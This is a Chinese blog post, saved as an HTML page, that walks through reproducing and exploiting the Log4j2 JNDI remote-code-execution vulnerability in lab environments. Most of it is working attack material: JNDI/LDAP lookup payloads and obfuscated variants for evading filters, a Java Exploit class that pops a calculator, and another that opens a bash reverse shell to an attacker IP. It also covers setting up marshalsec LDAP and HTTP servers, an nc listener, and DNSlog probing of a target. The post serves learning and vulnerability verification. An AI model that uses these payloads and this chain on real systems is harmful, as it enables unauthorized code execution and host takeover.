<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【log4j2漏洞复现与利用】 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="【log4j2漏洞复现与利用】" />
<meta property="og:description" content="文章目录 漏洞简介log4j2 教程环境搭建测试运行 专业名词解释及其payload分析利用工具简介：log4j2漏洞验证（弹出计算器版）被攻击者的log4j2 打印函数示例攻击者执行操作漏洞复现 log4j2漏洞验证（DNSlog版）DNSlog如何玩在vulfocus靶场验证log4j2漏洞 log4j2 靶场学习（反弹shell版）靶场环境代码简要分析被攻击者信息攻击者的操作 攻击绕过相关参考 漏洞简介 Apache Log4j2是一个基于Java的日志记录工具。Apache Log4j 2.x &lt;= 2.14.1版本存在远程代码执行漏洞。 漏洞的主要原因是log4j2的接收器对于不可靠来源的输入没有过滤，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
log4j2 教程 这里简要log4j2的使用方法以及代码示例 环境搭建 搭建log4j2环境的主要难点在于引入三方库，主要有maven库引用和jar包直接引用的方式。只要保证代码可以引用到对应的log4j2库即可。
知识点 1. java函数编写 2. javac 编译， java执行 3. maven库的使用; jar包的引入 测试运行 log4j2使用代码示例 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j { private static final Logger logger = LogManager.getLogger(log4j.class); public static void main(String[] args) { logger.error(&#34;hello world asdf.&#34;); logger.error(&#34;$${lookupName:key:${lower:env}}&#34;); logger.error(&#34;${env:aaa:-444444}&#34;); logger.error(&#34;${base64:SGVsbG8gV29ybGQhCg==}&#34;); logger.error(&#34;${log4j:configParentLocation}&#34;); logger.error(&#34;$${lower:{${java:os}}&#34;); logger.error(&#34;${upper:DhhASD}&#34;); logger.error(&#34;${java:os}&#34;); logger.error(&#34;${${env:base:-j}${lower:N}di:l${lower:D}${env:base:-a}p://qqqq.rblpq9.ceye.io/Log4jRC}&#34;); } } 输出结果：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/9988418181fc9e9e1d2724acbbe3698e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-01-31T21:37:25+08:00" />
<meta property="article:modified_time" content="2022-01-31T21:37:25+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【log4j2漏洞复现与利用】</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#_1" rel="nofollow">漏洞简介</a></li><li><a href="#log4j2__4" rel="nofollow">log4j2 教程</a></li><li><ul><li><a href="#_6" rel="nofollow">环境搭建</a></li><li><a href="#_14" rel="nofollow">测试运行</a></li></ul> 
   </li><li><a href="#payload_52" rel="nofollow">专业名词解释及其payload分析</a></li><li><a href="#_98" rel="nofollow">利用工具简介：</a></li><li><a href="#log4j2_121" rel="nofollow">log4j2漏洞验证（弹出计算器版）</a></li><li><ul><li><a href="#log4j2__131" rel="nofollow">被攻击者的log4j2 打印函数示例</a></li><li><a href="#_150" rel="nofollow">攻击者执行操作</a></li><li><a href="#_184" rel="nofollow">漏洞复现</a></li></ul> 
   </li><li><a href="#log4j2DNSlog_202" rel="nofollow">log4j2漏洞验证（DNSlog版）</a></li><li><ul><li><a href="#DNSlog_208" rel="nofollow">DNSlog如何玩</a></li><li><a href="#vulfocuslog4j2_213" rel="nofollow">在vulfocus靶场验证log4j2漏洞</a></li></ul> 
   </li><li><a href="#log4j2_shell_235" rel="nofollow">log4j2 靶场学习（反弹shell版）</a></li><li><ul><li><a href="#_249" rel="nofollow">靶场环境代码简要分析</a></li><li><a href="#_261" rel="nofollow">被攻击者信息</a></li><li><a href="#_266" rel="nofollow">攻击者的操作</a></li></ul> 
   </li><li><a href="#_306" rel="nofollow">攻击绕过相关参考</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="_1"></a>漏洞简介</h3> 
<p>Apache Log4j2是一个基于Java的日志记录工具。Apache Log4j 2.x &lt;= 2.14.1版本存在远程代码执行漏洞。 漏洞的主要原因是log4j2的接收器对于不可靠来源的输入没有过滤，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p> 
<h3><a id="log4j2__4"></a>log4j2 教程</h3> 
<ul><li>这里简要log4j2的使用方法以及代码示例</li></ul> 
<h4><a id="_6"></a>环境搭建</h4> 
<ol><li>搭建log4j2环境的主要难点在于引入三方库，主要有maven库引用和jar包直接引用的方式。只要保证代码可以引用到对应的log4j2库即可。<br> 知识点</li></ol> 
<pre><code class="prism language-shell"><span class="token number">1</span>. java函数编写
<span class="token number">2</span>. javac 编译， java执行
<span class="token number">3</span>. maven库的使用<span class="token punctuation">;</span> jar包的引入
</code></pre> 
<h4><a id="_14"></a>测试运行</h4> 
<ol start="2"><li>log4j2使用代码示例</li></ol> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"hello world   asdf."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$${lookupName:key:${lower:env}}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${env:aaa:-444444}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${base64:SGVsbG8gV29ybGQhCg==}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${log4j:configParentLocation}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$${lower:{${java:os}}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${upper:DhhASD}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${java:os}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${${env:base:-j}${lower:N}di:l${lower:D}${env:base:-a}p://qqqq.rblpq9.ceye.io/Log4jRC}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><code>输出结果：</code></p> 
<pre><code class="prism language-shell"><span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.003 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - hello world   asdf.
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.011 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token variable">${lookupName<span class="token operator">:</span>key<span class="token operator">:</span>${lower<span class="token operator">:</span>env}</span><span class="token punctuation">}</span>
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.011 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token number">444444</span>
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.011 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token variable">${base64<span class="token operator">:</span>SGVsbG8gV29ybGQhCg==}</span>
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.011 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - D:<span class="token punctuation">\</span>Work<span class="token punctuation">\</span>D<span class="token punctuation">\</span>Code<span class="token punctuation">\</span>maven-01<span class="token punctuation">\</span>target<span class="token punctuation">\</span>classes
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.015 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token variable">${lower<span class="token operator">:</span>{Windows 10 10.0<span class="token operator">,</span> architecture<span class="token operator">:</span> amd64-64}</span>
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.015 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token variable">${upper<span class="token operator">:</span>DhhASD}</span>
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.015 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - Windows <span class="token number">10</span> <span class="token number">10.0</span>, architecture: amd64-64
<span class="token number">21</span>-12-12 <span class="token number">12</span>:51:23.015 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR log4j - <span class="token variable">${${env<span class="token operator">:</span>base<span class="token operator">:-</span>j}</span><span class="token variable">${lower<span class="token operator">:</span>N}</span>di:l<span class="token variable">${lower<span class="token operator">:</span>D}</span><span class="token variable">${env<span class="token operator">:</span>base<span class="token operator">:-</span>a}</span>p://qqqq.rblpq9.ceye.io/Log4jRC<span class="token punctuation">}</span>
</code></pre> 
<ul><li>小结：<br> 此处试验了log4j的lookup的变量替换功能。例如${java:os}可以打印操作系统相关信息。这也是log4j2 payload变种的主要依据。<br> 此处有个疑问： ${lower:A} 这样的语法，日志打印中没有进行替换。</li></ul> 
<h3><a id="payload_52"></a>专业名词解释及其payload分析</h3> 
<p>首先看一下典型的payload示例：</p> 
<pre><code>${jndi:ldap://12345.p7yc0x.ceye.io:1389/aaa}
</code></pre> 
<p><code>这是利用的jndi注入的方式</code><br> 有几个专业名词，在这里解释一下：</p> 
<ul><li><code>payload:</code></li></ul> 
<blockquote> 
 <p>病毒通常会做一些有害的或者恶性的动作。在病毒代码中实现这个功能的部分叫做“有效负载”（payload）。payload可以实现任何运行在受害者环境中的程序所能做的事情，并且能够执行动作包括破坏文件删除文件，向病毒的作者或者任意的接收者发送敏感信息，以及提供通向被感染计算机的后门。</p> 
</blockquote> 
<ul><li><code>jndi:</code></li></ul> 
<blockquote> 
 <p>JNDI(Java Naming and Directory Interface),Java命名和目录接口,是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。<br> 这些对象可以存储在不同的命名或目录服务中，<strong>例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</strong></p> 
</blockquote> 
<p>参考资料：https://xz.aliyun.com/t/6633</p> 
<ul><li><code>ldap:</code></li></ul> 
<blockquote> 
 <p>LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。</p> 
</blockquote> 
<ul><li><code>DNSlog:</code></li></ul> 
<blockquote> 
 <p>DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名www.baidu.com等的访问信息，类似日志文件。</p> 
</blockquote> 
<blockquote> 
 <p>DNSlog 在web漏洞中是常见的使用方法， <strong>在某些无法直接利用漏洞获得回显的情况下， 但目标可以发起DNS请求， 这个时候就可以通过这种方式把想获得的数据外带出来。</strong></p> 
</blockquote> 
<hr> 
<p><strong>分析payload：</strong></p> 
<pre><code>${jndi:ldap://12345.p7yc0x.ceye.io:1389/aaa}
</code></pre> 
<p><code>jndi:ldap</code> 是jndi注入</p> 
<p><code>12345.p7yc0x.ceye.io</code> 是一个域名， 其中p7yc0x.ceye.io是攻击者自己申请的免费三级域名， <code>12345</code>是随便写的四级域名。域名申请网站有http://ceye.io/ (需要注册) 以及http://www.dnslog.cn/（无需注册）</p> 
<p><code>:1389/aaa</code> 端口信息以及路径</p> 
<p>此外，可以收集到payload的变种如下</p> 
<pre><code class="prism language-shell"><span class="token variable">${${env<span class="token operator">:</span>base<span class="token operator">:-</span>j}</span><span class="token variable">${lower<span class="token operator">:</span>N}</span>di:l<span class="token variable">${lower<span class="token operator">:</span>D}</span><span class="token variable">${env<span class="token operator">:</span>base<span class="token operator">:-</span>a}</span>p://bbb.rblpq9.ceye.io/Log4jRC<span class="token punctuation">}</span>
</code></pre> 
<p>主要还是使用了log4j2的lookup方式， 具体可以查询官方文档：https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</p> 
<h3><a id="_98"></a>利用工具简介：</h3> 
<p><code>postman:</code><br> 用于发送请求，请求中携带payload</p> 
<p><code>marshalsec</code><br> 这是一款java 反序列化利用工具，在本次实验中主要用来搭建LDAP服务器。<br> <strong>常用使用方式</strong><br> 开启RMI服务</p> 
<pre><code class="prism language-java">java <span class="token operator">-</span>cp target<span class="token operator">/</span>marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token number">.3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar <span class="token class-name"><span class="token namespace">marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span>RMIRefServer</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>css<span class="token operator">/</span>#<span class="token class-name">ExportObject</span> <span class="token number">1099</span>
</code></pre> 
<p>开启LDAP服务</p> 
<pre><code class="prism language-java">java <span class="token operator">-</span>cp target<span class="token operator">/</span>marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token number">.3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar <span class="token class-name"><span class="token namespace">marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span>LDAPRefServer</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>css<span class="token operator">/</span>#<span class="token class-name">ExportObject</span> <span class="token number">1389</span>
</code></pre> 
<p><strong>项目地址</strong></p> 
<pre><code>https://github.com/mbechler/marshalsec
</code></pre> 
<hr> 
<h3><a id="log4j2_121"></a>log4j2漏洞验证（弹出计算器版）</h3> 
<p><strong>假设如下（具体以实际ip为主）</strong><br> 被攻击者者ip: 1.1.1.1<br> 攻击者ip: 2.2.2.2</p> 
<p>  弹出计算器是常用的远程代码执行漏洞的验证方式。若攻击者的利用代码可以弹出计算器，则说明该漏洞可被利用执行命令。</p> 
<p><strong>思路</strong><br> log4j2打印出payload的内容，触发远程代码执行，可以执行一个提前准备好的java函数，该函数可执行开启计算器功能。</p> 
<h4><a id="log4j2__131"></a>被攻击者的log4j2 打印函数示例</h4> 
<p>假设被攻击者可能会运行如下代码：</p> 
<pre><code class="prism language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jTest1</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Log4jTest1</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"开始执行漏洞利用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//若java为高版本，需要开启这个才能利用</span>
       <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"asdfasfdasdfafafd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"${jndi:ldap://2.2.2.2:1389/adf}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"完成执行漏洞利用"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<hr> 
<h4><a id="_150"></a>攻击者执行操作</h4> 
<p>攻击者的利用代码如下：</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">static</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"攻击代码正在运行..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token class-name">String</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> cmd<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>攻击者还需要执行以下步骤</strong></p> 
<ul><li>编译攻击脚本,得到Exploit.class</li></ul> 
<pre><code class="prism language-shell">javac Exploit.java
</code></pre> 
<ul><li>在利用脚本所在路径下， 开启http服务器</li></ul> 
<pre><code>python -m http.server 8888
</code></pre> 
<ul><li>另外开一个窗口，开启ldap服务，默认端口为<code>1389</code></li></ul> 
<pre><code class="prism language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token number">.3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar <span class="token class-name"><span class="token namespace">marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span>LDAPRefServer</span> <span class="token string">"http://2.2.2.2:8888/#Exploit"</span>

</code></pre> 
<p>解释：其中的<code>#Exploit</code>需要和编译出的class文件名对应，不包含.class后缀。<br> 这样的话，被攻击者用log4j2打印出payload<code>"${jndi:ldap://2.2.2.2:1389/adf}"</code>，会自动执行Exploit.class</p> 
<hr> 
<h4><a id="_184"></a>漏洞复现</h4> 
<p>  被攻击者执行log4j2打印payload的操作, 即可触发启动计算器 ~</p> 
<p><strong>被攻击者的日志输出：</strong></p> 
<pre><code class="prism language-shell"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.
	at com.sun.jndi.ldap.Connection.createSocket<span class="token punctuation">(</span>Connection.java:373<span class="token punctuation">)</span>
	at com.sun.jndi.ldap.Connection.<span class="token operator">&lt;</span>init<span class="token operator">&gt;</span><span class="token punctuation">(</span>Connection.java:213<span class="token punctuation">)</span>
	<span class="token punctuation">..</span>. <span class="token number">42</span> <span class="token function">more</span>

<span class="token number">21</span>-12-12 <span class="token number">14</span>:50:11.969 <span class="token punctuation">[</span>main<span class="token punctuation">]</span> ERROR Log4jTest1 - <span class="token variable">${jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>2.2.2.2<span class="token operator">:</span>1389<span class="token operator">/</span>adf}</span>
完成执行漏洞利用
</code></pre> 
<h3><a id="log4j2DNSlog_202"></a>log4j2漏洞验证（DNSlog版）</h3> 
<p> DNSlog是黑客常用的探测log4j2漏洞是否存在的方式。</p> 
<p><strong>思路</strong><br> 输入是一个API接口， 调用API接口时携带payload(触发请求DNS)， 然后根据DNSlog日志中是否收到请求，来判断是否存在log4j漏洞以及获取含有漏洞的IP。</p> 
<h4><a id="DNSlog_208"></a>DNSlog如何玩</h4> 
<ol><li>在DNSlog 网站上申请一个免费的三级域名；</li><li>找一台机器ping 一下这个域名（可以加前缀变为4级域名）</li><li>在DNSlog网站上即可看到是哪个IP发送的请求</li></ol> 
<h4><a id="vulfocuslog4j2_213"></a>在vulfocus靶场验证log4j2漏洞</h4> 
<ul><li>假设待检测的目标为<code>vulfocus.fofa.so:57872</code></li><li>提前准备好的DNS域名为 <code>rblpq9.ceye.io</code></li><li>可以使用postman发送请求,主要信息如下：</li></ul> 
<blockquote> 
 <p>POST /hello HTTP/1.1 Host: vulfocus.fofa.so:22755 Content-Type: application/x-www-form-urlencoded <code>payload</code>=${jndi:ldap://<strong>ce_shi_yi_xia</strong>.rblpq9.ceye.io/<strong>wu_suo_wei</strong>}</p> 
</blockquote> 
<p>postman的主要截图如下：<br> <img src="https://images2.imgbox.com/11/79/KMlfLgfP_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/53/0b/KuvJpmkk_o.png" alt="在这里插入图片描述"></p> 
<p>DNSlog 主要截图如下：<br> <img src="https://images2.imgbox.com/db/09/qXL1XFbr_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="log4j2_shell_235"></a>log4j2 靶场学习（反弹shell版）</h3> 
<p>  接下来将介绍，在靶场环境下，尝试利用该漏洞执行反弹shell直接拿到主机权限的演示。</p> 
<p>靶场主要参考网络资源：<br> https://github.com/fengxuangit/log4j_vuln</p> 
<p>执行命令：</p> 
<pre><code class="prism language-shell">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
docker run -it -d -p <span class="token number">8080</span>:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 
docker <span class="token builtin class-name">exec</span> -it log4j_vuln_container /bin/bash
/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh
</code></pre> 
<h4><a id="_249"></a>靶场环境代码简要分析</h4> 
<p><img src="https://images2.imgbox.com/a1/2e/PND4Pw7Q_o.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-bqKlaLVL-1643579936132)(http://image.huawei.com/tiny-lts/v1/images/bc1189ad0409f1099dc0619001efb030_1425x460.png@900-0-90-f.png)]"></p> 
<blockquote> 
 <p>从代码中可以看出， 当请求参数中有c时， 会用log4j2打印参数内容， 容易触发漏洞。</p> 
</blockquote> 
<hr> 
<p><code>被攻击者ip:1.1.1.1</code><br> <code>攻击者ip:2.2.2.2</code></p> 
<h4><a id="_261"></a>被攻击者信息</h4> 
<p>POST 1.1.1.1:8080/webstudy/hello-fengxuan</p> 
<p>请求参数中可带内容 <code>c="payload"</code></p> 
<h4><a id="_266"></a>攻击者的操作</h4> 
<ol><li>编写反弹shell利用代码</li></ol> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">static</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span>
           <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span><span class="token string">"&gt;"</span> <span class="token punctuation">,</span><span class="token string">"/dev/tcp/2.2.2.2/5566"</span><span class="token punctuation">,</span> <span class="token string">"0&gt;&amp;1"</span> <span class="token punctuation">,</span><span class="token string">"2&gt;&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> 
<ol start="2"><li> <p>javac 编译</p> </li><li> <p>在利用脚本所在路径下， 开启http服务器</p> </li></ol> 
<pre><code>python -m http.server 8888
</code></pre> 
<ol start="4"><li>另外开一个窗口，开启ldap服务，默认端口为<code>1389</code></li></ol> 
<pre><code class="prism language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token number">.3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar <span class="token class-name"><span class="token namespace">marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span>LDAPRefServer</span> <span class="token string">"http://2.2.2.2:8888/#Exploit"</span>

</code></pre> 
<ol start="5"><li>另外开一个窗口，开启监听</li></ol> 
<pre><code class="prism language-shell"><span class="token function">nc</span> -lvp <span class="token number">5566</span>
</code></pre> 
<ol start="6"><li> <p>postman发送恶意请求<br> 其中body体中<br> c="${jndi:ldap://2.2.2.2:1389/adf}"</p> </li><li> <p>攻击成功， 获取shell</p> </li></ol> 
<h3><a id="_306"></a>攻击绕过相关参考</h3> 
<p>https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/4ae41e76bc7cb14140c081e74f1658bb/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">数学建模 - 时间序列分析</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d765d0013721c09a295db36e5d039241/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">4.3（工具）git整合IDEA</p>
		</a>
	</div>
</nav>


